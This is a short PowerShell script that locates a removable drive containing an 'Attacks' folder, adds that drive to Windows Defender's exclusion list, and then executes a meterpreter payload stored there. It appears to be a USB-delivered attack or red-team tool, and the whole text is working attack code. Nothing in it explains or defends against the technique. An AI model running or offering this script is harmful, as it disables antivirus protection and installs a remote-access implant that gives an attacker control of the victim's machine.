$USBDrive = get-psdrive |where {$_.Root -match ":"} |% {if (Test-Path ($_.Root + "Attacks")){$_.Root}}
Add-MpPreference -ExclusionPath $USBDrive
& "$USBDrive\Attacks\meterpreter\meterpreter.exe"
